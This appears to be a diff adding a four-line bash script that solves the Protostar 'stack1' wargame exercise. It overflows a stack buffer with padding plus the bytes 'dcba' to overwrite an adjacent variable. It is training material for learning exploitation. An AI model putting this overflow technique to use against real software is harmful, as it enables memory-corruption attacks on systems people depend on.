@@ -1,0 +1,4 @@
+#!/usr/bin/env bash
+
+echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa_dcba" \
+  | xargs /opt/protostar/bin/stack1
